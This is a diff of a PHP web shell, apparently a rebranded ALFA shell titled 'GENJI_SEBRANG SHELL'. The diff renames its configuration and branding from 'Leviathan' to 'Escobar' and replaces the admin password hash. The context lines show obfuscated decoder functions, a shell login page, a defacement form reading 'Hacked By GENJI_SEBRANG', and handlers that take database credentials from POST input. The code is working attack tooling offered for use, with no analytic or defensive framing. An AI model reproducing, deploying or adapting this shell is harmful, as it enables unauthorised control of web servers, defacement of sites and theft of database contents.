@@ -1,8 +1,8 @@
 <?php
 
-$GLOBALS['Leviathan'] = array(
+$GLOBALS['Escobar'] = array(
     'username' => 'admin-genji',
-    'password' => 'ec0dd7e0aaec6abb943733a29cb00040',
+    'password' => '$2a$10$20M37X.mppV3WmStQHgPxesIa3dkv43ShHW5/JGR8viqfn/Jx2UAO',
     'safe_mode' => '0',
     'login_page' => 'gui',
     'show_icons' => '1',
@@ -117,7 +117,7 @@ function __ZGVjb2Rlcg($s)
     return zRtSHsbTzV($s);
 }
 
-$GLOBALS['DB_NAME'] = $GLOBALS['Leviathan'];
+$GLOBALS['DB_NAME'] = $GLOBALS['Escobar'];
 
 foreach ($GLOBALS['DB_NAME'] as $key => $value)
 {
@@ -159,7 +159,7 @@ foreach ($GLOBALS['DB_NAME'] as $key => $value)
 	}
 }
 
-unset($GLOBALS['Leviathan']);
+unset($GLOBALS['Escobar']);
 
 if (!isset($_SERVER["HTTP_HOST"])) exit();
 
@@ -173,7 +173,7 @@ if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "Delves");
-define("__ALFA_DATA_FOLDER__", "LEVIATHAN");
+define("__ALFA_DATA_FOLDER__", "Escobar");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
@@ -525,10 +525,10 @@ loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; 
 loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>.: GENJI_SEBRANG SHELL :.</title><center>
-<center><img style="border-radius:100px;"width="500" height="250" alt="Leviathan Perfect Hunter" draggable="false" src="https://raw.githubusercontent.com/genji-sebrang/sam/refs/heads/main/genji-exploit.png" /></center>
+<center><img style="border-radius:100px;"width="500" height="250" alt="Escobar Perfect Hunter" draggable="false" src="https://raw.githubusercontent.com/genji-sebrang/sam/refs/heads/main/genji-exploit.png" /></center>
 <div id=loginbox><p><font face="DejaVu Sans" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>Leviathan Perfect Hunter</b></font></th></tr>
+<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>Escobar Perfect Hunter</b></font></th></tr>
 <tr><td bgcolor="black" style="padding:5">
 <form method="post">
 <input type="hidden" name="action" value="login">
@@ -3416,7 +3416,7 @@ echo "<br><div class='txtfont'>| Your Index |</div><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
-$s0levisible="Powered By Leviathan Perfect Hunter";
+$s0levisible="Powered By Escobar Perfect Hunter";
 $dbu = $_POST['alfa6'];
 $path = $_POST['alfa5'];
 $fname = $_POST['alfa4'];
@@ -3472,7 +3472,7 @@ echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name='index' rows='19' cols='103'><title>Hacked By GENJI_SEBRANG</title><b>Hacked By GENJI_SEBRANG</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
-$s0levisible="Powered By Leviathan Perfect Hunter";
+$s0levisible="Powered By Escobar Perfect Hunter";
 $dbu = $_POST['alfa2'];
 $dbn = $_POST['alfa3'];
 $dbp = $_POST['alfa4'];
